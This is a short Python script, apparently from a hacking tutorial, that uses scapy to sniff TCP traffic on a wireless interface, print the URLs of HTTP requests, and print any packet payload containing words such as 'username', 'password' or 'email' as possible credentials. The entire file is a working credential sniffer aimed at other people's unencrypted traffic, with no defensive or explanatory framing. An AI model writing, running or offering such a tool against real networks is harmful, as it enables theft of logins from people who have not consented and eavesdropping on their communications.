#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_packet, filter="tcp")

def get_url(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        #printing interesting stuff
        load = packet[scapy.Raw].load
        keywords = ["username","uname","user","id","email","password","pass","code"]
        for keyword in keywords:
            if keyword in load:
                return load


#process the packet received by scapy.sniff called by prn
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #printing url
        url = get_url(packet)
        print("HTTP request ->> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("Possible credentials ->> " + login_info + "\n\n")

sniff("wlp3s0")
